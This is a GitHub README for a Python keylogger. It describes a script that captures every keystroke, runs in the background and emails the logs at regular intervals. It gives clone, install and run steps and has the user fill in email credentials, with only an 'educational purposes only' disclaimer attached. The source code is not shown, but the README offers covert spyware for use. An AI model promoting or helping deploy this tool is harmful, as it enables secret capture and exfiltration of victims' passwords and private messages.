Keylogger Using Python

Overview

This is a simple keylogger script written in Python that records keystrokes and sends the logs via email at regular intervals.

Features

Captures all keystrokes

Sends recorded keystrokes to a specified email

Runs in the background

Prerequisites

Make sure you have the following installed:

Python 3.x

Required Python libraries:

keyboard

smtplib

threading

You can install the necessary dependencies using:

pip install keyboard

Usage

Clone this repository:

git clone https://github.com/ahmedhamzarana/Key-Logger.git

Navigate to the project folder:

cd Key-Logger

Open index.py and update the following variables with your email credentials:

EMAIL = 'YOUR-EMAIL'
PASSWORD = 'YOUR-PASSWORD'

Note: Using your email and password directly is not secure. Consider using app passwords or OAuth authentication.

Run the script:

python index.py

Disclaimer

This script is intended for educational purposes only. Do not use it for malicious purposes. Unauthorized use of a keylogger is illegal and can lead to severe legal consequences.

License

This project is licensed under the MIT License - see the LICENSE file for details.
